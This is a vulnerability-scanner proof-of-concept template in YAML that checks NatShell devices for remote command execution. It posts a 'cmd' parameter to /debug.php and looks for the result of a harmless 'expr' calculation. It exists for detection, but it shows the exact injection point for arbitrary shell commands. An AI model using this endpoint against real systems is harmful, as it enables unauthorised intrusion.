name: poc-yaml-natshell-debug-rce
set:
  r1: randomInt(1000000, 10000000)
  r2: randomInt(1000000, 10000000)
rules:
  - method: POST
    path: /debug.php?_t=0.6552206544742862
    follow_redirects: false
    body: |
      cmd=expr%20{{r1}}%20-%20{{r2}}
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
detail:
  author: Print1n(http://print1n.top)
  links:
    - https://mp.weixin.qq.com/s/CVe7GSRzCKcYXj5Pj8W5SA
